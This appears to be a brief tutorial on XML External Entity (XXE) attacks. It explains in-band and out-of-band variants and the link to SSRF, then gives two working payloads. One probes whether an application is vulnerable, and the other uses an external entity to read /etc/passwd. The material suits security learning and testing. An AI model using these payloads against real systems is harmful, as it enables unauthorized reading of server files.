This vulnerability abuses features of ***XML parsers/data***. 

It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system.

An XXE attack can be used to perform ***Server-Side Request Forgery (SSRF)*** inducing the web application to make requests to other applications.

**There are 2 types of XXE attacks:**

1) ***In-band XXE attack:*** In this type the attacker can receive an immediate reponse to the XXE payload.
2) ***Out-of-band XXE attack:*** In this type no immediate reponse is received from the web application and the attacker has to reflect the output of their XXE payload to some other file or their own server. 
***
# XXE attack payloads:

We can use the following payload to check whether a web application is vulnerable to XXE attack: 

```XML
`<!DOCTYPE replace [<!ENTITY name "feast"> ]>    
	<userInfo>     
		<firstName>falcon</firstName>     
		<lastName>&name;</lastName>    
	</userInfo>`
```

**NOTE:** After entering the above code into a search field, if the name "falcon feast" pops up on the web application then the application is vulernable to XXE.

If the web application is vulnerable to XXE, then you can try reading files within the web root directory which are not accessible through the browser. You can do this using:

```XML
<?xml version="1.0"?>   
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>   
<root>&read;</root>`
```
